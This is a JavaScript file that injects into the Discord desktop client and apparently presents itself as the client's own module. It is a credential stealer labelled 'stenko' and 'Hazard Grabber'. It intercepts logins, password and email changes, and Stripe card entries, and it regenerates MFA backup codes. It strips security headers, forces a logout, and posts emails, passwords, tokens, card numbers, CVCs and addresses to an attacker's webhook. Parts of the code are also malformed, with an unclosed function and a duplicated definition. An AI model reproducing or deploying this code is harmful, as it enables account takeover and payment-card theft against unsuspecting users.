const fs = require('fs');
const path = require('path');
const { BrowserWindow, session } = require('electron')
const querystring = require('querystring');
var webhook = "%WEBHOOK_LINK%";

function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "stenko"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "stenko"));
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
    return !1
}
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
	if (details.url.startsWith(webhook)) {
		if (details.url.includes("discord.com")) {
			callback({
				responseHeaders: Object.assign({
					'Access-Control-Allow-Headers': "*"
				}, details.responseHeaders)
			});
		} else {
			callback({
				responseHeaders: Object.assign({
					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
					'Access-Control-Allow-Headers': "*",
					"Access-Control-Allow-Origin": "*"
				}, details.responseHeaders)
			});
		}


	} else {
		delete details.responseHeaders['content-security-policy'];
		delete details.responseHeaders['content-security-policy-report-only'];

		callback({
			responseHeaders: {
				...details.responseHeaders,
				'Access-Control-Allow-Headers': "*"
			}
		})
	}

})
const Filter = {
	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
	if (details.url.startsWith("wss://")) {
			callback({
				cancel: true
			})
			return;
	}
	if (FirstTime()) {}

	callback({})
	return;
})
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
    if (FirstTime())
        if (details.url.startsWith("wss://")) {
            callback({
                cancel: !0
            })
        } else {
            callback({
                cancel: !1
            })
        }
})

function SendToWebhook(what) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, !0).then((token => {}))
}

function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
				window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

					if (token.startsWith("mfa")) {
						window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("authorization", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":true}));
              xmlHttp.responseText`, !0).then((codes) => {

							var fieldo = [];
							var baseuri = "https://premium.piratestealer.to/raw/"


							var gayass = JSON.parse(codes)

							let g = gayass.backup_codes
							const r = g.filter((code) => {
								return code.consumed == null
							})
							for (let z in r) {
								fieldo.push({
									name: `Code`,
									value: `\`${r[z].code.insert(4, "-")}\``,
									inline: true
								})
								baseuri += `${r[z].code.insert(4, "-")}<br>`
							}

							function totalFriends() {
								var f = JSON.parse(info4)
								const r = f.filter((user) => {

									return user.type == 1
								})
								return r.length
							}

							function CalcFriends() {
								var f = JSON.parse(info4)
								const r = f.filter((user) => {
									return user.type == 1
								})
								var gay = "";
								for (z of r) {
									var b = GetRBadges(z.user.public_flags)
									if (b != "") {
										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
									}
								}
								if (gay == "") {
									gay = "No Rare Friends"
								}
								return gay
							}

							function Cool() {
								const json = JSON.parse(info3)
								var billing = "";
								json.forEach(z => {
									if (z.type == "") {
										return "\`❌\`"
									} else if (z.type == 2 && z.invalid != !0) {
										billing += "\`✔️\`" + " <:paypal:896441236062347374>"
									} else if (z.type == 1 && z.invalid != !0) {
										billing += "\`✔️\`" + " :credit_card:"
									} else {
										return "\`❌\`"
									}
								})
								if (billing == "") {
									billing = "\`❌\`"
								}
								return billing
							}
        const json = JSON.parse(info);
        var params = {
            username: "stenko",
            content: "",
            avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
            embeds: [
                {
                    "title": `Total Friends (${totalFriends()})`,
                    "color": 3092790,
                    "description": CalcFriends(),
                    "author": {
                        "name": "stenko premium version",
			"url": `https://stenko.xyz`,
                    },
		    "thumbnail": {
                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": ""
                    }
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function ChangePassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
            const json = JSON.parse(info);
            var params = {
                username: "Hazard Grabber",
                content: "",
                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                embeds: [
                    {
                        "color": 16507654,
                        "fields": [
                            {
                                "name": "**Password Changed**",
                                "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
                                "inline": true
                            },
                            {
                                "name": "**Other Info**",
                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                "inline": true
                            },
                            {
                                "name": "**Token**",
                                "value": `\`${token}\``,
                                "inline": false
                            }
                        ],
                        "author": {
                            "name": json.username +"#" + json.discriminator + "・" + json.id,
                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                        },
                        "footer": {
                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                        }                 
                    }
                ]
            }
        SendToWebhook(JSON.stringify(params))
        })
    })
}

function ChangeEmail(newemail, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
            var params = {
                username: "Hazard Grabber",
                content: "",
                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                embeds: [
                    {
                        "color": 16507654,
                        "fields": [
                            {
                                "name": "**Email Changed**",
                                "value": `New Email: ${newemail}\nPassword: ${password}`,
                                "inline": true
                            },
                            {
                                "name": "**Other Info**",
                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                "inline": true
                            },
                            {
                                "name": "**Token**",
                                "value": `\`${token}\``,
                                "inline": false
                            }
                        ],
                        "author": {
                            "name": json.username +"#" + json.discriminator + "・" + json.id,
                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                        },
                        "footer": {
                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                        }                
                    }
                ]
            }
            SendToWebhook(JSON.stringify(params))
        })
    })
}

function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
            var json = JSON.parse(info);
            var params = {
                username: "Hazard Grabber",
                content: "",
                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                embeds: [
                    {
                        "color": 16507654,
                        "fields": [
                            {
                                "name": "**Credit Card Added**",
                                "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
                                "inline": true
                            },
                            {
                                "name": "**Other Info**",
                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                "inline": true
                            },
                            {
                                "name": "**Token**",
                                "value": `\`${token}\``,
                                "inline": false
                            }
                        ],
                        "author": {
                            "name": json.username + "#" + json.discriminator + "・" + json.id,
                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                        },
                        "footer": {
                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                        }
                    }
                ]
            }
            SendToWebhook(JSON.stringify(params))
        })
    })
}
function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			var json = JSON.parse(info);
            var params = {
                username: "Hazard Grabber",
                content: "",
                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                embeds: [
                    {
                        "color": 16507654,
                        "fields": [
                            {
                                "name": "**Credit Card Added**",
                                "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
                                "inline": true
                            },
                            {
                                "name": "**Other Info**",
                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                "inline": true
                            },
                            {
                                "name": "**Token**",
                                "value": `\`${token}\``,
                                "inline": false
                            }
                        ],
                        "author": {
                            "name": json.username + "#" + json.discriminator + "・" + json.id,
                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                        },
                        "footer": {
                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                        }
                    }
                ]
            }
			SendToWebhook(JSON.stringify(params))
		})
	})
}
const ChangePasswordFilter = {
	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
	if (details.url.endsWith("login")) {
		if (details.statusCode == 200) {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			const email = data.login;
			const password = data.password;
			const window = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
				Login(email, password, token)
			}))
		} else {}
	}
	if (details.url.endsWith("users/@me")) {
		if (details.statusCode == 200 && details.method == "PATCH") {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			if (data.password != null && data.password != undefined && data.password != "") {
				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						ChangePassword(data.password, data.new_password, token)
					}))
				}
				if (data.email != null && data.email != undefined && data.email != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						ChangeEmail(data.email, data.password, token)
					}))
				}
			}
		} else {}
	}
	if (details.url.endsWith("tokens")) {
		const window = BrowserWindow.getAllWindows()[0];
		const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
		window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
			CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token)
		}))
	}
});
module.exports = require('./core.asar')
